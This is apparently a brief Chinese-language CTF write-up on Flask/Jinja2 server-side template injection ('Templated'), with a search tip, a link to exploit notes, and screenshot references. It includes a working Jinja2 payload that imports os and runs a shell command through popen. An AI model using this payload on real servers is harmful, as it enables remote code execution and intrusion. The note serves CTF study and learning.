# Templated

SSTI模版注入

<img src=".\图片\Snipaste_2023-09-22_03-37-53.png" alt="Snipaste_2023-09-22_03-37-53" style="zoom:80%;" />

谷歌搜 关键词

```
flask/jinja2 exploit github
```

[Flask Jinja2 Pentesting | Exploit Notes (hdks.org)](https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/)

```
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

<img src=".\图片\Snipaste_2023-09-22_03-41-02.png" alt="Snipaste_2023-09-22_03-41-02" style="zoom:80%;" />


